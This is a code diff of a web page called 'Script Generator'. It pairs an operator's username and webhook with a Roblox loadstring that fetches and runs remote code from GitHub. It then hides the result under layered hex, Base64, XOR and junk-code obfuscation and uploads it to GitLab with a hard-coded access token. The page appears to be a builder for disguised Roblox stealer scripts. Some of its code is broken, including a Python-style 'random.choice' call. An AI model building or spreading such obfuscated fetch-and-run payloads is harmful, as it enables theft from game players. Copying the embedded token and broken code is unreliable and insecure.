@@ -1,114 +1,185 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Script Generator</title>
-    <style>
-        body {
-            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
-            color: white;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-            margin: 0;
-        }
-        h1 {
-            font-size: 3rem;
-        }
-        .container {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            margin-top: 20px;
-            text-align: center;
-            background: rgba(0, 0, 0, 0.7);
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
-        }
-        input, select, button {
-            padding: 10px;
-            border-radius: 8px;
-            border: none;
-            background-color: #333;
-            color: white;
-            font-size: 1rem;
-            width: 250px;
-        }
-        button {
-            background: #ff0080;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        button:hover {
-            background: #ff0055;
-            transform: scale(1.1);
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Script Generator</title>
+<style>
+body {
+  background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
+  color: white;
+  font-family: Arial, sans-serif;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  flex-direction: column;
+  margin: 0;
+}
+
+h1 { 
+  font-size: 3rem; 
+}
+
+.container {
+  display: flex;
+  flex-direction: column;
+  gap: 15px;
+  margin-top: 20px;
+  text-align: center;
+  background: rgba(0, 0, 0, 0.7);
+  padding: 20px;
+  border-radius: 10px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+}
+
+input, select, button {
+  padding: 10px;
+  border-radius: 8px;
+  border: none;
+  background-color: #333;
+  color: white;
+  font-size: 1rem;
+  width: 250px;
+}
+
+button {
+  background: #ff0080;
+  cursor: pointer;
+  transition: 0.3s;
+}
+
+button:hover {
+  background: #ff0055;
+  transform: scale(1.1);
+}
+</style>
 </head>
 <body>
-    <h1>Script Generator</h1>
-    <div class="container">
-        <input type="text" id="username" placeholder="Enter your Username" value="void6674109">
-        <input type="text" id="webhook" placeholder="Enter Webhook URL">
-        <button onclick="generateScript()">Generate Script</button>
-    </div>
+<h1>Script Generator</h1>
+<div class="container">
+  <input type="text" id="username" placeholder="Enter your Username" value="void6674109">
+  <input type="text" id="webhook" placeholder="Enter Webhook URL">
+  <select id="script-select">
+    <option value="Blox Fruits">Blox Fruits</option>
+    <option value="Pet Simulator 99">Pet Simulator 99</option>
+    <option value="Pls Donate">Pls Donate</option>
+  </select>
+  <button onclick="generateScript()">Generate Script</button>
+</div>
 
-    <script>
-        // Loadstrings for different games
-        let loadstrings = {
-            "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
-            "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
-            "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
-        };
+<script>
+const PAT = 'glpat-8si5orFgbXbJE4uzHwKS';
+const projectID = '67450323';
+const loadstrings = {
+  "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
+  "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
+  "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
+};
 
-        // Function to encode to Hex
-        function hexEncode(script) {
-            return script.split('').map(c => c.charCodeAt(0).toString(16)).join('');
-        }
+function randomString(length) {
+  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  let result = '';
+  for (let i = 0; i < length; i++) {
+    result += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  return result;
+}
 
-        // Function to Base64 encode
-        function base64Encode(str) {
-            return btoa(unescape(encodeURIComponent(str)));
-        }
+function base64Encode(str) {
+  return btoa(unescape(encodeURIComponent(str)));
+}
 
-        // Combine Hex + Base64 for strong obfuscation
-        function obfuscateScript(script) {
-            let hex = hexEncode(script);
-            return base64Encode(hex);
-        }
+function hexEncode(str) {
+  return str.split('').map(c => c.charCodeAt(0).toString(16)).join('');
+}
 
-        // Generate and upload script
-        function generateScript() {
-            let username = document.getElementById('username').value;
-            let webhook = document.getElementById('webhook').value;
+function junkCode() {
+  let junk = [
+    "local _unused = math.random()",
+    "local __dummy = string.reverse('dummy')",
+    "local __junk = 'OBF'..tostring(math.random(1000,9999))"
+  ];
+  return junk[Math.floor(Math.random() * junk.length)];
+}
 
-            if (!username || !webhook) {
-                alert("Please enter both Username and Webhook URL!");
-                return;
-            }
+function obfuscateScript(script) {
+  let base64Encoded = base64Encode(script);
+  let hexEncoded = hexEncode(base64Encoded);
 
-            let selectedScript = loadstrings["Blox Fruits"]; // Fixed to Blox Fruits or change as needed
+  let obfuscationMethods = [
+    function(script) {
+      let replacements = {
+        'Username': `_G_${randomString(5)}`,
+        'Webhook': `_G_${randomString(5)}` 
+      };
+      return script.replace(/Username/g, replacements.Username).replace(/Webhook/g, replacements.Webhook); 
+    },
 
-            let rawScript = `Username = "${username}"\nWebhook = "${webhook}"\n${selectedScript}`;
-            let obfuscatedScript = obfuscateScript(rawScript);
+    function(script) {
+      let randomStrings = [
+        'local _unused = math.random()',
+        'local __dummy = string.reverse("dummy")',
+        'local __junk = "OBF"..tostring(math.random(1000,9999))'
+      ];
+      return script + " " + random.choice(randomStrings); 
+    },
 
-            // Final loadstring for Roblox Executor
-            let finalScript = `loadstring(game:HttpGet("data:text/plain;base64,${obfuscatedScript}"))()`;
+    function(script) {
+      const key = Math.random() * 1000000; // Example key, replace with a more secure key
+      let encryptedScript = '';
+      for (let i = 0; i < script.length; i++) {
+        encryptedScript += String.fromCharCode(script.charCodeAt(i) ^ key);
+      }
+      return `loadstring(function()local _G_${randomString(5)} = '${encryptedScript}' return _G_${randomString(5)} end)()`;
+    }
+  ];
 
-            // Copy to clipboard automatically
-            navigator.clipboard.writeText(finalScript).then(() => {
-                alert("Obfuscated script copied to clipboard!");
-            }).catch(err => {
-                console.error('Error copying:', err);
-                alert("Failed to copy script.");
-            });
-        }
-    </script>
+  script = random.choice(obfuscationMethods)(script); 
 
+  return `loadstring((function()local _G_${randomString(5)} = \"${hexEncoded}\"local _G_${randomString(5)} = \"\"for i=1, #_G_${randomString(5)}, 2 do_G_${randomString(5)} = _G_${randomString(5)} .. string.char(tonumber(_G_${randomString(5)}:sub(i, i+1), 16))endlocal ${randomString(4)} = game:GetService("HttpService"):Base64Decode(_G_${randomString(5)})${junkCode()}return ${randomString(4)}end)())()`;
+}
+
+function generateScript() {
+  let username = document.getElementById('username').value;
+  let webhook = document.getElementById('webhook').value;
+  let selectedScript = document.getElementById('script-select').value;
+  if (!username || !webhook) {
+    alert("Please enter both Username and Webhook URL!");
+    return;
+  }
+  let script = `Username = \"${username}\"Webhook = \"${webhook}\"${loadstrings[selectedScript]}`;
+  let obfuscatedScript = obfuscateScript(script);
+  uploadToGitLab(obfuscatedScript);
+}
+
+function uploadToGitLab(content) {
+  let filename = `${randomString(10)}.lua`;
+  fetch(`https://gitlab.com/api/v4/projects/${projectID}/repository/files/${encodeURIComponent(filename)}`, {
+    method: 'POST',
+    headers: {
+      'PRIVATE-TOKEN': PAT,
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      branch: 'main',
+      content: btoa(content),
+      commit_message: 'Add obfuscated script'
+    })
+  }).then(response => response.json()).then(data => {
+    if (data.file_path) {
+      let loadstring = `loadstring(game:HttpGet('https://gitlab.com/void6674109/Void/-/raw/main/${filename}'))()`;
+      navigator.clipboard.writeText(loadstring).then(() => {
+        alert("Script uploaded & Loadstring copied!" + loadstring);
+      });
+    } else {
+      alert("Upload failed. Check PAT & Project ID.");
+    }
+  }).catch(error => {
+    console.error('Upload Error:', error);
+    alert("Error uploading. Check console.");
+  });
+}
+</script>
 </body>
 </html>
